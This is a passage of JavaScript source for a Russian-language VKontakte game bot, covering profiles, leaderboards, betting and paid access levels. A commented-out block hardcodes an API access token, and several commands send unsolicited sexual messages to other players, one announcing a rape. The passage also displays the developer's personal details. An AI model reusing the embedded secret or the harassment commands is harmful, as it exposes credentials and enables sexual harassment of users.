		requests.post({url: 'https://api.vk.com/method/appWidgets.update', form:{
			v: '5.95',
			type: 'table',
			code: `return ${JSON.stringify(script)};`,
                access_token: '787cb705a0ee08ba84767ab0843549ec724a2244946d50e7e30098f985f3cf4981fa9125cca25f33629f6' // Специальный токен с уровнем доступа app_widgets
            }
        },
        function(err, resp, body) {
        	console.log(body)
        }
        )
		console.log("Виджет обновлён!")
	}
	updateWidget()
	setInterval(updateWidget, 10500)*/












	vk.updates.hear(/^(?:статистика)/i, (message) => {
		if(user.full == false) return;
		let b = 0; 
		for(a in acc.users){ 
			if(Number(acc.users[a].balance)) { 
				b += acc.users[a].balance 
			} 
		} 

		let z = 0; 
		for(a in acc.users){ 
			if(Number(acc.users[a].bitcoin)) { 
				z += acc.users[a].bitcoin 
			} 
		} 

		let x = 0; 
		for(a in acc.users){ 
			if(Number(acc.users[a].global_exs)) { 
				x += acc.users[a].global_exs
			} 
		}

		let bn = 0; 
		for(a in acc.users){ 
			if(Number(acc.users[a].bank)) { 
				bn += acc.users[a].bank 
			} 
		} 

		let t = 0; 
		for(a in acc.users){ 
			if(Number(acc.users[a].ban)) { 
				t += acc.users[a].ban 
			} 
		} 
		message.reply(`
			💿 Статистика базы данных:

			😸 Количество игроков: ${spaces(acc.number)}
			🚫 Заблокировано: ${utils.sp(t)}
			💭 Обработано всего сообщений: ${spaces(acc.msg)}

			💰 Сумма всех денег игроков: ${utils.sp(b)}$ 
			💳 Сумма в банке: ${utils.sp(bn)}$
			👑 Сумма всего рейтинга игроков: ${utils.sp(x)}
			🌐 Биткоины всех игроков: ${utils.sp(z)}₿
			`);
	});





	vk.updates.hear(/^(?:fsex|фсекс|фзаняться сексом)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		let args = message.$match[1];
		if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
			if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: SEX [ID] ❤ `);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
		if(user.full == false) return message.send(`Упс.... Ошибочка :))`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
		var is = [user_id(message.user), message.text] 
		let text = `❤ ➾ Игрок ${user.prefix} занялся с вами самым незабываемым Сексом ❤`
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: text,			random_id: 0
		}); 
		return message.send(`❤ @id${user.id}(${user.prefix}), вы занялись Сексом с [${acc.users[message.$match[1]].prefix}]`);
	}); 

	vk.updates.hear(/^(?:fkuni|фкуни|фсделать куни)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		let args = message.$match[1];
		if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
			if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: KUNI [ID] ❤ `);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
		if(user.full == false) return message.send(`Упс.... Ошибочка :))`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
		var is = [user_id(message.user), message.text] 
		let text = `❤ ➾ Игрок ${user.prefix} сделал тебе самый незабываемый куни ❤`
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: text,			random_id: 0
		}); 
		return message.send(`❤ @id${user.id}(${user.prefix}), вы сделали куни игроку [${acc.users[message.$match[1]].prefix}]`);
	}); 

	vk.updates.hear(/^(?:fminet|фминет|фсделать минет)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		let args = message.$match[1];
		if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
			if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: MINET [ID] ❤ `);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
		if(user.full == false) return message.send(`Упс.... Ошибочка :))`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
		var is = [user_id(message.user), message.text] 
		let text = `❤ ➾ ${user.prefix} сделала тебе самый незабываемый Минет ❤`
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: text,			random_id: 0
		}); 
		return message.send(`❤ @id${user.id}(${user.prefix}), вы сделали минет игроку [${acc.users[message.$match[1]].prefix}]`);
	}); 

	vk.updates.hear(/^(?:fkiss|фпоцеловать)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		let args = message.$match[1];
		if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
			if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: KISS [ID] ❤ `);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
		if(user.full == false) return message.send(`Упс.... Ошибочка :))`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
		var is = [user_id(message.user), message.text] 
		let text = `❤ ➾ Игрок ${user.prefix} Поцеловал(а) тебя ❤`
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: text,			random_id: 0
		}); 
		return message.send(`❤ @id${user.id}(${user.prefix}), вы поцеловали [${acc.users[message.$match[1]].prefix}]`);
	}); 

	vk.updates.hear(/^(?:fiznas|физнасиловать)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		let args = message.$match[1];
		if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
			if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: iznas [ID] ❤ `);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ ID Должен содержать только цифры`);
		if(user.full == false) return message.send(`Упс.... Ошибочка :))`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Игрок не найден!`);
		var is = [user_id(message.user), message.text] 
		let text = `❤ ➾ Игрок ${user.prefix} изнасиловал вас.. 😨`
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: text,			random_id: 0
		}); 
		return message.send(` ❤ @id${user.id}(${user.prefix}), вы изнасиловали [${acc.users[message.$match[1]].prefix}]`);
	}); 

//ФД




//////////////////////////////////////////////////////////////////////////
vk.updates.hear(/^(?:Бот)/i,  (message) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	let stick = [11257,10343,11269,10373,7332,8758,7498,9935].random();
	if(user.act == false) return message.send(`[Чат-Менеджер @bot.anya (Бот Анна)]: ${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send({sticker_id: stick});
});

vk.updates.hear(/^(?:о боте)$/i, (message) => {
	let dev = '';   
	let user = acc.users[user_id(message.user)];
	return message.send(`
		@id${user.id}(${user.prefix}), Информация о проекте:
		📝 Проект: @bot.anya (Бот Анна)


		💻 Система
		💻 » Наш сайт: В разработке
		💻 » Зарегистрировано Аккаунтов: ${acc.number}
		💻 » UpTime @bot.anya (Бота Анна): Дн: ${uptime.days} || Ч: ${uptime.hours} || Мин: ${uptime.min} || Сек: ${uptime.sec}
		💻 » Cообщений: ${acc.msg}
		💻 » Версия системы: 0.1

		📚 Прочее: 
		⛔ » Не забудьте вступить в группу: @bot.anya (Бот Анна)
		📢 » В ЛС группы работает бот - без задержек.
		Список наших бесед вы можете узнать, написав команду "Беседы"
		`);
});
vk.updates.hear(/^(?:беседы)$/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	return message.send(`
		@id${user.id}(${user.prefix}), Ссылки на наши беседы:\n [Официальная беседа]: (1) - https://vk.me/join/AJQ1dw6EpAlTS5rqA7y/dPVl

		`);
});

vk.updates.hear(/^(?:developer)/i,  message => {
	let user = acc.users[user_id(message.user)];
	message.send(`


		😈 Информация о: @id287908009 (Артём Большаков) 😈

		🔐 » Разработчик/Кодер/продавец ботов. 😎
		🔐 » Стаж: 5 лет. 😉
		📈 » Статус: Идентифицирован ✓


		💻 Данные: 😌
		📉 » Имя: Артём 📌
		📊 » Фамилия: Большаков 📌
		📑 » Отчество: Максимович📌
		📑 » Дата рождения: 11.04.2001 📌
		📑 » Проживание: Г. Архангельск 📌

		⚙ » Боты Артёма: 
		⚙ 1  @bot.anya (Анна | Игровой Бот) 'Основной'

		ᅠ          ❤ » Интересы: Программирование, изучение, создание
		ᅠ          📡 » Связь: https://vk.com/id287908009 || @id287908009 (Артём Большаков)
		💻 » ID Профиля во всех его ботах: 0 или 1
		💻 » ID В данном боте: 2 
		💻 » Уровень доступа: Разработчик
		💻 » ID VK: @id287908009  (287908009 )

		Сейчас: ${time()} МСК -- ${data()} Года`)
	message.send({attachment:`audio449532928_456239406`})
	return message.send({sticker_id: 40})
});

vk.updates.hear(/^(?:баланс|💰 Баланс)/i,  (message) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.act == false) return message.send(`${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	if(user.balance == null) return message.send(`${rnick}, произошла критическая ошибка в системе.\n Пожалуйста, сообщите в репорт.`);
	if(user.balance == NaN) return message.send(`${rnick}, произошла критическая ошибка в системе.\n Пожалуйста, сообщите в репорт.`);
	message.send(`
		${rnick}, на руках: ${spaces(user.balance)}$, (${utils.rn(user.balance)})
		💳 Донат счёт: ${user.rub}₽
		`+(user.bank == 0 ? `` : `💰 Денег в банке: ${spaces(user.bank)}$\n`)+
		(user.bitcoin  == 0 ? `` : `🌐 Биткоинов: ${spaces(user.bitcoin)}฿\n`)+`
		`)
});



vk.updates.hear(/^(?:get)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)]; 
	let warns = '';
	if(!message.$match[1] || !Number(message.$match[1]) || !acc.users[message.$match[1]]) return message.send(`🔸 Проверьте вводимые данные.`);
	for(i=0;i<acc.users[message.$match[1]].warn_p.length;i++){warns += `⛔ -- ${acc.users[message.$match[1]].warn_p[i]}\n`}
		if(user.level < 1) return; 
	let id = acc.users[message.$match[1]]
	return message.send(`
		Профиль:
		🔎 ID: ${message.$match[1]}
		`+(id.verify == false ? `✓ Верификация: не подтверждён\n` : `✓ Верификация: подтверждён\n`)+
		(id.act == false ? `🔑 Аккаунт:  не Активирован\n` : `🔑 Аккаунт: Активирован\n`)+
		(id.lock == false ? `📗 Состояние профиля: Закрытый\n` : `📗 Состояние профиля: Открытый\n`)+
		(id.stat == false ? `🔎 Статус Профиля: не установлен\n` : `🔎 Персональный статус профиля: ${id.stat}\n`)+
		`👀 Ник (💙): ${id.prefix}
		📎 ID Профиля VK: ${id.id}
		📎 Профиль VK: @id${id.id}(Перейти)
		💰 Денег: ${id.balance}$
		💳 В банке: ${id.bank}
		💳 Донат счёт: ${id.rub}₽
		👑 Рейтинг: ${id.global_exs}
		🌐 Биткоинов: ${id.bitcoin}฿
		❤ Сердец: ${id.donate}
		♻ Уровень: ${id.lvl}
		🔑 Ключей для кейсов: ${id.keys} штук
		`+(id.brak == false ? `👫 Партнер: Не женат\n` : `👫 Партнер:   ${acc.users[id.brak].prefix}\n`)+
		`        `+(id.youtube == false ? `💻 YouTube Канал: Отсутствует\n` : `💻 YouTube Канал: ${id.youtube}\n`)+
		`

		🔑 Имущество:\n` +
		(id.lodka== false ? `🛥 Яхта: Нет\n` : `🛥 Яхта: ${id.lodka}\n`)+ 
		(id.house== false ? `🏠 Дом: Нет\n` : `🏠 Дом: ${id.house}\n`)+   
		(id.pit== false ? `🐼 Питомец: Нет\n` : `🐼 Питомец:  ${id.pit}\n`)+
		(id.gun_name== false ? `🔫 Ствол: Нет\n` : `🔫 Ствол: ${id.gun_name}\n`)+
		(id.phone== false ? `📱 Телефон: Нет\n` : `📱  Телефон: ${id.phone}\n`)+
		(id.pk== false ? `💻 » Компьютер: Нет\n` : `💻 » Компьютер: ${id.pk}\n`)+
		(id.spk== false ? `💻 » Состояние ПК: Выключен\n` : `💻 » Состояние ПК: Включен\n`)+
		(id.bizs.one_biz == false ? `🔋 Бизнес 1: Нет\n` : `🔋 Бизнес 1: ${id.bizs.one.name} || ${spaces(id.bizs.one.zp)}$/час\n`)+  
		(id.bizs.two_biz == false ? `🔋 Бизнес 2: Нет\n` : `🔋 Бизнес 2: ${id.bizs.two.name} || ${spaces(id.bizs.two.zp)}$/час\n`)+   
		`
		👑 Топ: Включен
		🔔 Уведомления: Включены
		📗 Дата регистрации: ${id.rtime}
		`+(id.block_pay== false ? `⛔ Бан передачи: Нет\n` : `⛔ Бан передачи: Есть\n`)+
		(id.block_rep== false ? `🆘 Бан репорта: Нет\n` : `🆘 Бан репорта: Есть\n`)+
		`⏱ Последняя активность: ${id.msg.last_msg}
		📚 Сообщений боту: ${id.msg.messages}
		⚠ Варнов: [${id.warn}/3] || Причины: [${id.warn}]\n${warns}

		⛔ Доступ: ${id.level.toString().replace(/0/gi, "Игрок").replace(/1/gi, "VIP").replace(/2/gi, "Модератор").replace(/3/gi, "Администратор").replace(/4/gi, "Главный Администратор").replace(/5/gi, "Основатель")}
		`+
		(user.level >= 5 ? `⛔ ADMvig: [${id.ainfo.vig}/3]\n` : ``)+
		(id.ban == false ? `⚠ Аккаунт не заблокирован\n` : `⛔ ЗАБЛОКИРОВАН [${id.ban}] -- Навсегда`)
		);
});


vk.updates.hear(/^(?:phone)$/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.volftube8 == false) return message.send(`📱 У вас нет телефона !`);
	return message.send(`

		📱 sms [id] [Сообщение] - отправить смс игроку
		📱 phonpay [сумма] - пополнить баланс телефона
		📱 buysim - Купить sim-карту

		`)
});

vk.updates.hear(/^(?:phonpay)\s?([0-9]+)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(user.phone == false) return message.send(`@id${user.id}(${user.prefix}), У вас нет телефона !`);
	if(user.sphone == false) return message.send(`@id${user.id}(${user.prefix}), У вас нет симки ! Чтобы купить, напишите " buysim "`);
	if(user.balance == null) return message.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`);
	if(user.bphone == null) return message.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`);
	if(user.balance < message.$match[1]) return message.send(`💸 ➾ У вас нет столько денег !`)
		if(user.lvl >= 0){
			if(!message.$match[1] || message.$match[1] < 0 || message.$match[1] > 15000) return message.send(`Пример: 'phonpay' ( лимит 15.000 $ )`);
			user.balance -= Number(message.$match[1]);
			user.bphone += Number(message.$match[1]);
		}
		return message.send(`@id${user.id}(${user.prefix}), Вы положили на мобильный счет ${spaces(message.$match[1])}$`);
	});

vk.updates.hear(/^(?:вабанк)/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.balance < 1) return message.send(`@id${user.id}(${user.prefix}), у тебя нет денег!`);
	let rez = [true, false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.balance += user.balance;
		return message.send(`@id${user.id}(${user.prefix}), вы выиграли!\n Ваш баланс -- ${spaces(user.balance)}$`);
	}else{ 
		let count = [0].random();
		user.balance = count;
		return message.send(`@id${user.id}(${user.prefix}), вы проиграли все свои деньги!`);
	}
});

vk.updates.hear(/^(?:БТОП)/i,  (message) => {

	let text = ``;
	var tops = []
	for (i=1;i<200000;i++) {
		if(acc.users[i]){
			tops.push({
				id: i,
				idvk: acc.users[i].id,
				lvl: acc.users[i].balance
			})

		} 

	}
	tops.sort(function(a, b) {
		if (b.lvl > a.lvl) return 1
			if (b.lvl < a.lvl) return -1
				return 0
		})
	var yo = []

	for (var g = 0; g < 10; g++) {
		if (tops.length > g) {
			let ups = g;
			ups += 1;
			if(g <= 8) ups = `${ups}&#8419;`
			if(g == 9) ups = `&#128287;`
			yo.push({
				id: tops[g].id,
				idvk: tops[g].idvk,
				lvl: tops[g].lvl,
				smile: `${ups}`
			})
		}
	}
	var people = "💰 ТОП ПО БАЛАНСУ 💰\n" + yo.map(a => a.smile + ". [id" + a.idvk + "|" + acc.users[a.id].prefix + "] - " + spaces(a.lvl) + "💰").join("\n")
	text += `${people}\n\n`; 
	message.send(text);
});

vk.updates.hear(/^(?:Купить VIP|купить вип|buy вип|buy vip)/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.rub < 110) return message.send(`@id${user.id}(${user.prefix}), у вас не хватает Денег -- У вас ${user.rub}₽\n -- Стоймость Уровня доступа: VIP -- 110₽\nПополнить счет можно тут: https://qiwi.me/bot_yulya\n После перевода скинуть скрин-шот покупки @id287908009(Основателю)!\n Он выдаст вам 110₽`);
	user.rub -= 110;
	user.level = 1;
	let rez = [true, false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`@id${user.id}(${user.prefix}), вы купили VIP-Аккаунт.\n-- На ваш Аккаунт успешно установлен уровень доступа: VIP\nПомощь -- "ahelp"`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`@id${user.id}(${user.prefix}), вы купили VIP-Аккаунт.\n-- На ваш Аккаунт успешно установлен уровень доступа: VIP\nПомощь -- "ahelp"`);
	}
});

vk.updates.hear(/^(?:Купить Modera|купить Модератора|Купить Mod|buy Модератора|buy ModerA)/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.rub < 250) return message.send(`@id${user.id}(${user.prefix}), у вас не хватает Денег -- У вас ${user.rub}₽\n -- Стоймость Уровня доступа: Модератор -- 250₽\nПополнить счет можно тут: https://qiwi.me/bot_yulya\n После перевода скинуть скрин-шот покупки @id287908009(Основателю)!\n Он выдаст вам 250₽`);
	user.rub -= 250;
	user.level = 2;
	let rez = [true, false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`@id${user.id}(${user.prefix}), вы купили Доступ: Модератор\n-- На ваш Аккаунт успешно установлен уровень доступа: Модератор\nПомощь -- "ahelp"`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`@id${user.id}(${user.prefix}), вы купили Доступ: Модератор\n-- На ваш Аккаунт успешно установлен уровень доступа: Модератор\nПомощь -- "ahelp"`);
	}
});

vk.updates.hear(/^(?:Купить Admin|купить Админку|Купить Adm|buy Админку|buy Admin)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.rub < 470) return message.send(`@id${user.id}(${user.prefix}), у вас не хватает Денег -- У вас ${user.rub}₽\n -- Стоймость Уровня доступа: Администратор -- 470₽\nПополнить счет можно тут: https://qiwi.me/bot_yulya\n После перевода скинуть скрин-шот покупки @id287908009(Основателю)!\n Он выдаст вам 470₽`);
	user.rub -= 470;
	user.level = 3;
	let rez = [true, false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`@id${user.id}(${user.prefix}), вы купили Доступ: Администратор\n-- На ваш Аккаунт успешно установлен уровень доступа: Администратор\nПомощь -- "ahelp"`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`@id${user.id}(${user.prefix}), вы купили Доступ: Администратор\n-- На ваш Аккаунт успешно установлен уровень доступа: Администратор\nПомощь -- "ahelp"`);
	}
});

vk.updates.hear(/^(?:Купить GLADM|купить ГлАдм|Купить GA|buy ГлАдмин|buy GLADM)/i, (message) => {   
	let user = acc.users[user_id(message.user)];
	if(user.rub < 690) return message.send(`@id${user.id}(${user.prefix}), у вас не хватает Денег -- У вас ${user.rub}₽\n -- Стоймость Уровня доступа: Главный Администратор -- 690₽\nПополнить счет можно тут: https://qiwi.me/bot_yulya\n После перевода скинуть скрин-шот покупки @id287908009(Основателю)!\n Он выдаст вам 690₽`);
	user.rub -= 690;
	user.level = 4;
	let rez = [true, false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`@id${user.id}(${user.prefix}), вы купили Доступ: Гланый Администратор\n-- На ваш Аккаунт успешно установлен уровень доступа: Главный Администратор\nПомощь -- "ahelp"`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`@id${user.id}(${user.prefix}), вы купили Доступ: Главный Администратор\n-- На ваш Аккаунт успешно установлен уровень доступа: Главный Администратор\nПомощь -- "ahelp"`);
	}
});


vk.updates.hear(/^(?:buykey)/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.donate < 100) return message.send(`@id${user.id}(${user.prefix}), у вас не хватает Сердец❤ -- [у вас ${user.donate} сердечек << ❤]\n -- Стоймость Ключа 100 Сердец = 50₽\n🔑 Ключей от кейсов: ${user.keys}\nПополнить счет можно тут: [https://qiwi.me/bot_yulya]\n После пополнения скинуть скрин-шот покупки @id287908009(Основателю)!`);
	user.donate -= 100;
	user.keys += 1;
	let rez = [true, false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`@id${user.id}(${user.prefix}), вы успешно преобрели 1 ключ на открытие кейса.\n Баланс ключей: ${user.keys} 🔑\n-- Что бы открыть кейс введи: "kopen"`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`@id${user.id}(${user.prefix}), вы успешно преобрели 1 ключ на открытие кейса.\n Баланс ключей: ${user.keys} 🔑\n-- Что бы открыть кейс введи: "kopen"`);
	}
});

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
vk.updates.hear(/^(?:игропрофиль)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	return message.send(`
		@id${user.id}(${user.prefix}), ваш Игро-Профиль « 📕
		🔸 ID: ${user_id(message.user)}
		🔸 Баланс: ${spaces(user.balance)}$
		💳 Донат счёт: ${user.rub}₽
		🔑 Ключей от кейсов: ${user.keys}

		🎲 Игры « 🎲	 
		🎰 Казино: [Побед: ${user.game.kazwin}/ Поражений: ${user.game.kazlose}]
		📊 Акции: [Побед: ${user.game.binwin}/ Поражений: ${user.game.binlose}]
		🎲 Ставка: [Побед: ${user.game.stavka_win}/ Поражений: ${user.game.stavka_lose}]
		💰 Рандом: [Побед: ${user.game.rand_win}/ Поражений: ${user.game.rand_lose}]
		🔫 Стрелы: [Побед: ${user.game.strela_loose}/ Поражений: ${user.game.strela_win}] 
		`);

});


vk.updates.hear(/^(?:key)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	return message.send(`
		🔑 Ключей от кейсов: ${user.keys}
		`);

});



vk.updates.hear(/^(?:профиль|проф|📡 Профиль)\s?([0-9]+)?/i, (message) => { 
	let cars = [0, 'Mercedes S-Class','Volkswagen Phaeton','Lexus LS 430','Skoda Rapid','Audi A8','Range Rover','BMW X6','Porsche Cayenne','BMW 7 Series','Lexus LX']
	let hel = [0, 'Agusta A129 Mangusta','Ми-24','AH-2','CAIC WZ-10','HAL LCH','Eurocopter Tiger','Ка-52','Apache']
	let air = [0, 'Fokker DR1 Triplane','Mitsubishi A6M Zero','Су-35С']

	let user = acc.users[user_id(message.user)];
	if(user.balance == null) return message.send(`⚠ Произошла ошибка! Пожалуйста, сообщите в репорт.`);
	if(user.balance == NaN) return message.send(`⚠ Произошла ошибка! Пожалуйста, сообщите в репорт.`);
	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); 
	let id = user_id(message.user)
	let warns = '';
	for(i=0;i<user.warn_p.length;i++){warns += `⛔ ${user.warn_p[i]}\n`}

		if(!message.$match[1]){
			return message.send(``+(user.fix === false ? `` : `[${user.fix}]`) + ` @id${user.id}(${user.prefix}), твой профиль:
				🔎 ID: ${user_id(message.user)}
				`+(user.verify == false ? `⛔ Верификация: не подтверждён\n` : `✓ Верификация: подтверждён\n`)+
				(user.act == false ? `🔑 Аккаунт:  не Активирован\n` : `🔑 Аккаунт: Активирован\n`)+
				(user.lock == false ? `📗 Состояние профиля: Закрытый\n` : `📗 Состояние профиля: Открытый\n`)+
				(user.stat == false ? `🔎 Статус Профиля: не установлен\n` : `🔎 Персональный статус профиля: ${user.stat}\n`)+`
				💰 Денег: ${spaces(user.balance)}$
				💰 Денег в банке: ${spaces(user.bank)}$
				🌐 Биткоинов: ${spaces(user.bitcoin)}
				❤ Сердец: ${spaces(user.donate)}
				👑 Рейтинг: ${spaces(user.global_exs)}
				💳 Донат счёт: ${user.rub}₽
				♻ Уровень: ${user.lvl} [${user.exs}🌟/${user.exsup}🌟]
				`
				+(user.partner == false ? `` : `💍 В браке с: @id${acc.users[user.partner].id} (${acc.users[user.partner].prefix})\n`) +`
				`+(user.youtube == false ? `💻 YouTube Канал: Отсутствует\n` : `💻 YouTube Канал: ${user.youtube}\n`)+
				`
				🔑 Имущество:\n` +
				(user.aircraft == false ? `✈ Самолет:  Отсутствует\n` : `✈ Самолет:  ${air[user.aircraft]}\n`)+
				(user.helicopter == false ? `🚁 Вертолет: Отсутствует\n` : `🚁 Вертолет: ${hel[user.helicopter]}\n`)+
				(user.cars == false ? `🚗 Машина: Отсутствует\n` : `🚗 Машина: ${cars[user.cars]}\n`)+  
				(user.lodka == false ? `🛥 Яхта: Отсутствует\n` : `🛥 Яхта: ${user.lodka}\n`)+ 
				(user.house == false ? `🏠 Дом: Отсутствует\n` : `🏠 Дом: ${user.house}\n`)+
				(user.pit== false ? `🐼 Питомец:  Отсутствует\n` : `🐼 Питомец:  ${user.pit}\n`)+   
				(user.phone== false ? `📱 Телефон:  Отсутствует\n` : `📱 Телефон:  ${user.phone}\n`)+  
				(user.pk== false ? `💻 Комьютер:  Отсутствует\n` : `💻 Компьютер:  ${user.pk}\n`)+
				(user.spk== false ? `💻 » Состояние ПК: Выключен\n` : `💻 » Состояние ПК: Включен\n`)+ 
				` 
				🔑 Карманы: `+(user.gun_name == false ? `Пусто\n` : `Есть ствол | Название: ${user.gun_name}\n`)+  
				`
				⛔ Ваш уровень доступа: ${user.level.toString().replace(/0/gi, "Пользователь").replace(/1/gi, "VIP-Пользователь").replace(/2/gi, "Модератор").replace(/3/gi, "Администратор").replace(/4/gi, "Главный Администратор").replace(/5/gi, "Основатель")}

				📗 Дата регистрации: ${user.rtime} 
				`);
		}else{
			if(!Number(message.$match[1]) || !acc.users[message.$match[1]]) return message.send(`🔸 ➾ Проверьте вводимые данные.`);
			if(!acc.users[message.$match[1]].act == true) return message.send(`Аккаунт пользователя не Активирован!`);
			if(!acc.users[message.$match[1]].lock == true) return message.send(`Аккаунт пользователя Закрыт!`);
			let id = acc.users[message.$match[1]]
			return message.send(`
				📋 Информация об игроке [${id.prefix}] 📋
				🔎 ID: ${message.$match[1]}
				`+(id.verify == false ? `⛔ Верификация: не подтверждён\n` : `✓ Подтверждёный Профиль.\n
					Эта отметка означает, что профиль ${id.prefix} подтвержден администрацией @bot.anya (Бот Анна).\n\n`)+

				(id.act == false ? `🔑 Аккаунт:  не Активирован\n` : `🔑 Аккаунт: Активирован\n`)+
				(id.stat == false ? `🔎 Статус Профиля: не установлен\n` : `🔎 Статус Профиля: ${id.stat}\n`)+`
				💰 Денег: ${spaces(id.balance)}$
				🌐 Биткоинов: ${spaces(id.bitcoin)}
				❤ Сердец: ${spaces(id.donate)}
				👑 Рейтинг: ${spaces(id.global_exs)}
				💳 Донат счёт: ${id.rub}₽
				` +(id.youtube == false ? `💻 YouTube Канал: Отсутствует\n` : `💻 YouTube Канал: ${id.youtube}\n`)+`
				` +
				(id.brak == false ? `👫 Партнер: Не женат\n` : `👫 Партнер:   ${acc.users[id.brak].prefix}\n`)+
				`
				🔑 Карманы: `+(id.gun_name == false ? `Пусто\n` : `Есть ствол | Название: ${id.gun_name}\n`)+  
				` 
				⛔ Доступ: ${id.level.toString().replace(/0/gi, "Пользователь").replace(/1/gi, "VIP-Пользователь").replace(/2/gi, "Модератор").replace(/3/gi, "Администратор").replace(/4/gi, "Главный Администратор").replace(/5/gi, "Основатель")}

				📗 Дата регистрации: ${id.rtime} 
				`);
		}

	});



//////////////////////////////////////////
vk.updates.hear(/^(?:топ)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.act == false) return message.send(`${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`); 
	let text = ``; 
	var tops = [] 
	for (i=1;i<200000;i++) { 
		if(acc.users[i]){ 
			if(acc.users[i].level < 2 && acc.users[i].block_top == false){ 
				tops.push({ 
					id: i, 
					idvk: acc.users[i].id, 
					lvl: acc.users[i].global_exs 
				}) 
			}
		} 

	} 
	tops.sort(function(a, b) { 
		if (b.lvl > a.lvl) return 1 
			if (b.lvl < a.lvl) return -1 
				return 0 
		}) 
	var yo = [] 

	for (var g = 0; g < 10; g++) { 
		if (tops.length > g) { 
			let ups = g; 
			ups += 1; 
			if(g <= 8) ups = `${ups}⃣` 
				if(g == 9) ups = `🔟` 
					yo.push({ 
						id: tops[g].id, 
						idvk: tops[g].idvk, 
						lvl: tops[g].lvl, 
						smile: `${ups}` 
					}) 
			} 
		} 
		var people = "Топ игроков: \n" + yo.map(a => a.smile + ". [id" + a.idvk + "|" + acc.users[a.id].prefix + "] - " + spaces(a.lvl) + "👑  |  " + utils.rn(acc.users[a.id].balance) + " 💰").join("\n")
		text += `${people}\n\n`; 
		message.send(text);
	});

const utils = {
	sp: (int) => {
		int = int.toString();
		return int.split('').reverse().join('').match(/[0-9]{1,3}/g).join('.').split('').reverse().join('');
	},
	rn: (int, fixed) => {
		if (int === null) return null;
		if (int === 0) return '0';
		fixed = (!fixed || fixed < 0) ? 0 : fixed;
		let b = (int).toPrecision(2).split('e'),
